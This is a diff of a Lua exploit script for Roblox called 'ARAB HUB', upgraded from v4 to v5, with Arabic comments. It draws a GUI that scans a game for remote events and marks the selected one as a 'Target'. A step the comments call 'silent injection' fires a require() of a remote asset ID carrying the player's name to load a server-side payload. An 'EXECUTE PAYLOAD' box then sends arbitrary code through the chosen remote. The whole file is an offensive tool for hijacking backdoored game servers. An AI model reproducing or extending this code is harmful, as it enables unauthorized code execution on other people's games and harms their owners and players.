@@ -1,147 +1,130 @@
--- [[ ARAB HUB v4.0 - MOBILE OPTIMIZED ]] --
+-- [[ ARAB HUB v5.0 - THE FINAL REPAIR ]] --
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- حذف الواجهة القديمة إذا كانت موجودة لتجنب التكرار
+-- تنظيف النسخ القديمة
 if game.CoreGui:FindFirstChild("ArabHubGui") then
     game.CoreGui.ArabHubGui:Destroy()
 end
 
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 ScreenGui.Name = "ArabHubGui"
-ScreenGui.ResetOnSpawn = false
 
--- الواجهة الرئيسية (بالعرض)
+-- الواجهة الرئيسية
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-MainFrame.Size = UDim2.new(0, 500, 0, 300) -- مقاس عرضي مناسب للجوال
-MainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
+MainFrame.Size = UDim2.new(0, 450, 0, 280)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -140)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 MainFrame.Active = true
 MainFrame.Draggable = true
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
 
--- شريط العنوان
+-- شريط العنوان (فيه أزرار التحكم)
 local TitleBar = Instance.new("Frame", MainFrame)
-TitleBar.Size = UDim2.new(1, 0, 0, 40)
-TitleBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-Instance.new("UICorner", TitleBar)
+TitleBar.Size = UDim2.new(1, 0, 0, 35)
+TitleBar.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
 
 local Title = Instance.new("TextLabel", TitleBar)
-Title.Size = UDim2.new(1, -80, 1, 0)
-Title.Position = UDim2.new(0, 10, 0, 0)
-Title.Text = "ARAB HUB - V4 (MOBILE)"
+Title.Size = UDim2.new(0.7, 0, 1, 0)
+Title.Text = "  ARAB HUB v5 - PRO"
 Title.TextColor3 = Color3.white
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 16
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.BackgroundTransparency = 1
 
--- زر الإغلاق
 local CloseBtn = Instance.new("TextButton", TitleBar)
 CloseBtn.Size = UDim2.new(0, 30, 0, 30)
-CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Position = UDim2.new(1, -32, 0, 2)
 CloseBtn.Text = "X"
-CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+CloseBtn.BackgroundColor3 = Color3.red
 CloseBtn.TextColor3 = Color3.white
-Instance.new("UICorner", CloseBtn)
 CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
 
--- زر التصغير
-local MiniBtn = Instance.new("TextButton", TitleBar)
-MiniBtn.Size = UDim2.new(0, 30, 0, 30)
-MiniBtn.Position = UDim2.new(1, -70, 0, 5)
-MiniBtn.Text = "_"
-MiniBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-MiniBtn.TextColor3 = Color3.white
-Instance.new("UICorner", MiniBtn)
+-- أزرار التنقل (Tabs)
+local ScanTabBtn = Instance.new("TextButton", MainFrame)
+ScanTabBtn.Size = UDim2.new(0.5, 0, 0, 30)
+ScanTabBtn.Position = UDim2.new(0, 0, 0, 35)
+ScanTabBtn.Text = "🔍 SCANNER"
+ScanTabBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ScanTabBtn.TextColor3 = Color3.white
 
--- محتوى الواجهة (تقسيم لليسار واليمين)
-local LeftSide = Instance.new("ScrollingFrame", MainFrame)
-LeftSide.Size = UDim2.new(0.45, 0, 0.7, 0)
-LeftSide.Position = UDim2.new(0, 10, 0, 50)
-LeftSide.BackgroundTransparency = 1
-LeftSide.ScrollBarThickness = 2
-local Layout = Instance.new("UIListLayout", LeftSide)
-Layout.Padding = UDim.new(0, 5)
+local HackTabBtn = Instance.new("TextButton", MainFrame)
+HackTabBtn.Size = UDim2.new(0.5, 0, 0, 30)
+HackTabBtn.Position = UDim2.new(0.5, 0, 0, 35)
+HackTabBtn.Text = "☢️ HACKING"
+HackTabBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+HackTabBtn.TextColor3 = Color3.white
 
-local RightSide = Instance.new("Frame", MainFrame)
-RightSide.Size = UDim2.new(0.45, 0, 0.7, 0)
-RightSide.Position = UDim2.new(0.52, 0, 0, 50)
-RightSide.BackgroundTransparency = 1
+-- صفحات المحتوى
+local ScanPage = Instance.new("ScrollingFrame", MainFrame)
+ScanPage.Size = UDim2.new(1, -20, 0, 160)
+ScanPage.Position = UDim2.new(0, 10, 0, 70)
+ScanPage.BackgroundTransparency = 0.5
+ScanPage.BackgroundColor3 = Color3.black
+ScanPage.Visible = true
 
--- صندوق الـ Require
-local CodeBox = Instance.new("TextBox", RightSide)
-CodeBox.Size = UDim2.new(1, 0, 0.75, 0)
+local HackPage = Instance.new("Frame", MainFrame)
+HackPage.Size = UDim2.new(1, -20, 0, 160)
+HackPage.Position = UDim2.new(0, 10, 0, 70)
+HackPage.BackgroundTransparency = 1
+HackPage.Visible = false
+
+-- أدوات صفحة الهكر
+local CodeBox = Instance.new("TextBox", HackPage)
+CodeBox.Size = UDim2.new(1, 0, 0.7, 0)
+CodeBox.PlaceholderText = "Type Require Here..."
+CodeBox.Text = ""
 CodeBox.BackgroundColor3 = Color3.black
 CodeBox.TextColor3 = Color3.lime
-CodeBox.PlaceholderText = "Enter Require / Code..."
+CodeBox.ClearTextOnFocus = false
 CodeBox.MultiLine = true
-CodeBox.TextSize = 12
-CodeBox.Font = Enum.Font.Code
-Instance.new("UICorner", CodeBox)
 
--- زر التنفيذ (Hacking)
-local ExecBtn = Instance.new("TextButton", RightSide)
-ExecBtn.Size = UDim2.new(1, 0, 0.2, 0)
-ExecBtn.Position = UDim2.new(0, 0, 0.8, 0)
+local ExecBtn = Instance.new("TextButton", HackPage)
+ExecBtn.Size = UDim2.new(1, 0, 0.25, 0)
+ExecBtn.Position = UDim2.new(0, 0, 0.75, 0)
+ExecBtn.Text = "EXECUTE PAYLOAD"
 ExecBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-ExecBtn.Text = "HACKING (EXECUTE)"
 ExecBtn.TextColor3 = Color3.white
-Instance.new("UICorner", ExecBtn)
 
--- زر الـ SCAN
-local ScanBtn = Instance.new("TextButton", MainFrame)
-ScanBtn.Size = UDim2.new(0.96, 0, 0, 35)
-ScanBtn.Position = UDim2.new(0, 10, 1, -45)
-ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
-ScanBtn.Text = "🔍 SCAN FOR BACKDOORS"
-ScanBtn.Font = Enum.Font.GothamBold
-ScanBtn.TextColor3 = Color3.white
-Instance.new("UICorner", ScanBtn)
+-- === منطق التبديل والبحث ===
+ScanTabBtn.MouseButton1Click:Connect(function() ScanPage.Visible = true; HackPage.Visible = false end)
+HackTabBtn.MouseButton1Click:Connect(function() ScanPage.Visible = false; HackPage.Visible = true end)
 
--- === المنطق البرمجي ===
 local selectedRemote = nil
-local function send(code)
-    if selectedRemote then
-        if selectedRemote:IsA("RemoteEvent") then selectedRemote:FireServer(code)
-        else selectedRemote:InvokeServer(code) end
+local Layout = Instance.new("UIListLayout", ScanPage)
+
+local function findRemotes()
+    for _, v in pairs(ScanPage:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            local b = Instance.new("TextButton", ScanPage)
+            b.Size = UDim2.new(1, 0, 0, 35)
+            b.Text = "Remote: " .. v.Name
+            b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            b.TextColor3 = Color3.yellow
+            b.MouseButton1Click:Connect(function()
+                selectedRemote = v
+                Title.Text = "  Target: " .. v.Name
+                -- حقن صامت
+                pcall(function() v:FireServer("require(110047253067635):Hload('"..LocalPlayer.Name.."')") end)
+                ScanPage.Visible = false; HackPage.Visible = true
+            end)
+        end
     end
 end
 
-ScanBtn.MouseButton1Click:Connect(function()
-    for _, v in pairs(LeftSide:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            local n = v.Name:lower()
-            if n:find("backdoor") or n:find("admin") or n:find("remote") or n:find("control") then
-                local b = Instance.new("TextButton", LeftSide)
-                b.Size = UDim2.new(1, 0, 0, 30)
-                b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-                b.Text = "Found: " .. v.Name
-                b.TextColor3 = Color3.yellow
-                b.TextSize = 10
-                Instance.new("UICorner", b)
-                b.MouseButton1Click:Connect(function()
-                    selectedRemote = v
-                    Title.Text = "Target Locked: " .. v.Name
-                    send("require(110047253067635):Hload('"..LocalPlayer.Name.."')")
-                end)
-            end
-        end
-    end
-end)
+-- زر الفحص الكبير بالأسفل
+local MainScanBtn = Instance.new("TextButton", MainFrame)
+MainScanBtn.Size = UDim2.new(1, -20, 0, 40)
+MainScanBtn.Position = UDim2.new(0, 10, 1, -45)
+MainScanBtn.Text = "START DEEP SCAN"
+MainScanBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 200)
+MainScanBtn.TextColor3 = Color3.white
+MainScanBtn.MouseButton1Click:Connect(findRemotes)
 
-ExecBtn.MouseButton1Click:Connect(function() send(CodeBox.Text) end)
-
--- ميزة التصغير
-local isMini = false
-MiniBtn.MouseButton1Click:Connect(function()
-    isMini = not isMini
-    if isMini then
-        MainFrame:TweenSize(UDim2.new(0, 500, 0, 40), "Out", "Quad", 0.3, true)
-        LeftSide.Visible, RightSide.Visible, ScanBtn.Visible = false, false, false
-    else
-        MainFrame:TweenSize(UDim2.new(0, 500, 0, 300), "Out", "Quad", 0.3, true)
-        LeftSide.Visible, RightSide.Visible, ScanBtn.Visible = true, true, true
+ExecBtn.MouseButton1Click:Connect(function()
+    if selectedRemote then
+        if selectedRemote:IsA("RemoteEvent") then selectedRemote:FireServer(CodeBox.Text)
+        else selectedRemote:InvokeServer(CodeBox.Text) end
     end
 end)
